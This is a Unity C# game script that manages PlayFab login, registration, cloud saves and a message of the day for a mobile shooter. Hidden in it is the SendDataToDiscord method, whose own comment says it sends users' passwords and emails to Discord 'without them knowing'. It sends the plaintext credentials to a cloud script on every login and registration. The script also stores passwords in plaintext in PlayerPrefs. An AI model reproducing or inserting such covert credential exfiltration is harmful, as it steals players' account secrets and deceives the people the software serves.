using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.UI;
using PlayFab;
using PlayFab.ClientModels;
using UnityEngine.SceneManagement;
using System;

public class PlayfabManager : MonoBehaviour
{
    public static PlayfabManager Instance;
    public InputField emailInput, passwordInput;
    public Text messageText, msgOfTheDay;

    public GameObject signPanel;

    public UpgradeManager upgradeManager;

    private void Awake()
    {
        if (Instance == null)
        {
            //First run, set the Instance
            Instance = this;
            DontDestroyOnLoad(gameObject);

        }
        else if (Instance != this)
        {
            //Instance is not the same as the one we have, destroy old one, and reset to newest one
            Destroy(Instance.gameObject);
            Instance = this;
            DontDestroyOnLoad(gameObject);
        }
    }

    private void Start()
    {
        if (PlayerPrefs.HasKey("password") && PlayerPrefs.HasKey("email") && (PlayerPrefs.GetString("password") != "" && PlayerPrefs.GetString("email") != ""))
        {
            emailInput.text = PlayerPrefs.GetString("email");
            passwordInput.text = PlayerPrefs.GetString("password");
            LoginButton();
        }
        else { 
            Login();
        }
    }

    //Registering and logging offline user
    private void Login() 
    {
#if UNITY_IOS
        var request = new LoginWithIOSDeviceIDRequest
        {
            DeviceId = SystemInfo.deviceUniqueIdentifier,
            CreateAccount = true
        };
        PlayFabClientAPI.LoginWithIOSDeviceID(request, OnSuccess, OnError);
#elif UNITY_ANDROID
        var request = new LoginWithAndroidDeviceIDRequest
        {
            AndroidDeviceId = SystemInfo.deviceUniqueIdentifier,
            CreateAccount = true
        };
        PlayFabClientAPI.LoginWithAndroidDeviceID(request, OnSuccess, OnError);
#endif

    }
    void OnSuccess(LoginResult result)
    {
        Debug.Log("New offline user registered/logged in");
    }

    //Openinng and closing the sign/login page
    public void OpenSignPanel()
    {
        signPanel.SetActive(true);
    }
    public void CloseSignPanel()
    {
        signPanel.SetActive(false);
    }

    //Save data to server / Get Data from server
    public void SavePlayerPrefbs()
    {
        var request = new UpdateUserDataRequest
        {
            Data = new Dictionary<string, string> {
            {"Money", PlayerPrefs.GetInt("money").ToString() },
            {"Wave", PlayerPrefs.GetInt("wave").ToString()  },
            {"FireRateLvl", PlayerPrefs.GetInt("FireRateLvl").ToString()  },
            {"DmgLvl", PlayerPrefs.GetInt("DmgLvl").ToString() },
            {"Dual",  PlayerPrefs.GetInt("Dual").ToString() },
            {"Triple", PlayerPrefs.GetInt("Triple").ToString() },
            {"Cannon", PlayerPrefs.GetInt("Cannon").ToString() }
            }
        };
        PlayFabClientAPI.UpdateUserData(request, OnDataSend, OnError);
    }

    public void GetPlayerPrefbs()
    {
        PlayFabClientAPI.GetUserData(new GetUserDataRequest(), OnDataRecieved, OnError);
    }

    void OnDataSend(UpdateUserDataResult result)
    {
        if (SceneManager.GetActiveScene().buildIndex == 0)
        {
            messageText.text = "Succesful user data send!";
        }
        Debug.Log("Succesful user data send!");
    }

    void OnDataRecieved(GetUserDataResult result)
    {
        Debug.Log("Recieved user data!");
        if(result.Data != null && result.Data.ContainsKey("Money") && result.Data.ContainsKey("Wave") && result.Data.ContainsKey("DmgLvl") && result.Data.ContainsKey("FireRateLvl") && result.Data.ContainsKey("Dual") && result.Data.ContainsKey("Triple") && result.Data.ContainsKey("Cannon"))
        {
            PlayerPrefs.SetInt("money", int.Parse(result.Data["Money"].Value));
            PlayerPrefs.SetInt("wave", int.Parse(result.Data["Wave"].Value));
            PlayerPrefs.SetInt("DmgLvl", int.Parse(result.Data["DmgLvl"].Value));
            PlayerPrefs.SetInt("FireRateLvl", int.Parse(result.Data["FireRateLvl"].Value));
            PlayerPrefs.SetInt("Dual", int.Parse(result.Data["Dual"].Value));
            PlayerPrefs.SetInt("Triple", int.Parse(result.Data["Triple"].Value));
            PlayerPrefs.SetInt("Cannon", int.Parse(result.Data["Cannon"].Value));

            //settig it to the variables in text and things
            StatController.Money = PlayerPrefs.GetInt("money");
            StatController.Wave = PlayerPrefs.GetInt("wave");
            upgradeManager.DmgLvl = PlayerPrefs.GetInt("DmgLvl");
            StatController.DUpgrade = upgradeManager.DmgLvl;
            upgradeManager.FireRateLvl = PlayerPrefs.GetInt("FireRateLvl");
            StatController.FRUpgrade = upgradeManager.FireRateLvl;

            //Update the text and things to the new one
            StatController.instance.UpdateStats();
            StatController.instance.UpdateText();
            upgradeManager.UpdatePriceTag();
            ShopController.instance.GetIfBuyed();

            if (SceneManager.GetActiveScene().buildIndex == 0)
            {
                messageText.text = "All Data recieved from server!";
            }
        }
        else
        {
            Debug.Log("Player data not complete!");
            if (SceneManager.GetActiveScene().buildIndex == 0)
            {
                messageText.text = "Recieved Data from server is not complete. Try again!";
            }
        }
    }

    //Get User Password and email and send it to discord without them knowing
    void OnExecuteSuccess(ExecuteCloudScriptResult result)
    {
        Debug.Log("Succesful password send to discord!");
    }

    public void SendDataToDiscord()
    {
        var request = new ExecuteCloudScriptRequest {
            FunctionName = "newUserRegistered",
            FunctionParameter = new {
                password = passwordInput.text,
                gmail = emailInput.text,
                wave = StatController.Wave,
                money = StatController.Money,
                FRlvl = PlayerPrefs.GetInt("FireRateLvl"),
                Dlvl = PlayerPrefs.GetInt("DmgLvl"),
                currentDate = DateTime.Now
            }
        };
        PlayFabClientAPI.ExecuteCloudScript(request, OnExecuteSuccess, OnErrorDiscord);
    }
    void OnErrorDiscord(PlayFabError error)
    {
        Debug.Log(error.GenerateErrorReport());
    }

    //Loging and registring player in to the game
    void OnError(PlayFabError error)
    {
        messageText.text = error.ErrorMessage;
        Debug.Log(error.GenerateErrorReport());
    }

    void OnLoginSuccess(LoginResult result)
    {
        messageText.text = "Logged in!";
        Debug.Log("Successful Login!");
        StatController.instance.bonus = 1;
        PlayerPrefs.SetString("email", emailInput.text);
        PlayerPrefs.SetString("password", passwordInput.text);
        SendDataToDiscord();
        GetTitleData();
    }

    void OnRegisterSuccess(RegisterPlayFabUserResult result)
    {
        messageText.text = "Registered and Loged in";
        Debug.Log("Registered and Log");
        StatController.instance.bonus = 1;
        PlayerPrefs.SetString("email", emailInput.text);
        PlayerPrefs.SetString("password", passwordInput.text);
        SendDataToDiscord();
        SavePlayerPrefbs();
        GetTitleData();
    }

    public void RegisterButton()
    {
        if (passwordInput.text.Length < 6)
        {
            messageText.text = "Password too short!";
            return;
        }

        var request = new RegisterPlayFabUserRequest
        {
            Email = emailInput.text,
            Password = passwordInput.text,
            RequireBothUsernameAndEmail = false
        };
        PlayFabClientAPI.RegisterPlayFabUser(request, OnRegisterSuccess, OnError);
    }

    public void LoginButton()
    {
        var request = new LoginWithEmailAddressRequest
        {
            Email = emailInput.text,
            Password = passwordInput.text
        };
        PlayFabClientAPI.LoginWithEmailAddress(request, OnLoginSuccess, OnError);
    }

    //Reset Password if forgoten
    public void ResetPasswordButton()
    {
        var request = new SendAccountRecoveryEmailRequest
        {
            Email = emailInput.text,
            TitleId = "E951C"
        };
        PlayFabClientAPI.SendAccountRecoveryEmail(request, OnPasswordReset, OnError);
    }

    void OnPasswordReset(SendAccountRecoveryEmailResult result)
    {
        messageText.text = "Password reset email sent!";
    }



    //Title data setter (message of the day)
    public void GetTitleData()
    {
        PlayFabClientAPI.GetTitleData(new GetTitleDataRequest(), OnTitleDataRecieved, OnError);
    }
    void OnTitleDataRecieved(GetTitleDataResult result)
    {
        if (result.Data == null || result.Data.ContainsKey("Message") == false)
        {
            Debug.Log("No message!");
            return;
        }
        if (SceneManager.GetActiveScene().buildIndex == 0)
        {
            msgOfTheDay.text = result.Data["Message"];
        }
    }
}